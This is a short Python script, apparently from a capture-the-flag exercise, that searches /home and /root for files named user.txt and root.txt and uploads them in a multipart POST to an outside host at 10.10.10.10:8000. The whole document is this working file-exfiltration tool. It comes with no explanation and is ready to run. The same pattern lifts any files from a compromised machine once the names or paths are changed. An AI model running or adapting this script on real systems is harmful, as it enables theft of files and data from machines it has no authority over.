import os,sys,uuid,urllib.request
paths=['/home','/root']
files=[]
for base in paths:
  for name in ['user.txt','root.txt']:
    for root,dirs,fs in os.walk(base):
      if name in fs:
        files.append(os.path.join(root,name))
files=list(dict.fromkeys(files))
boundary='----WebKit'+uuid.uuid4().hex
body=[]
for f in files:
  try:
    data=open(f,'rb').read()
  except Exception:
    continue
  body.append('--'+boundary)
  body.append('Content-Disposition: form-data; name="file"; filename="%s"'%os.path.basename(f))
  body.append('Content-Type: application/octet-stream')
  body.append('')
  body.append(data)
body.append('--'+boundary+'--')
body_bytes=b''
for part in body:
  if isinstance(part,bytes):
    body_bytes+=part+b'\r\n'
  else:
    body_bytes+=part.encode()+b'\r\n'
req=urllib.request.Request('http://10.10.10.10:8000/upload',data=body_bytes,headers={'Content-Type':'multipart/form-data; boundary=%s'%boundary})
urllib.request.urlopen(req)
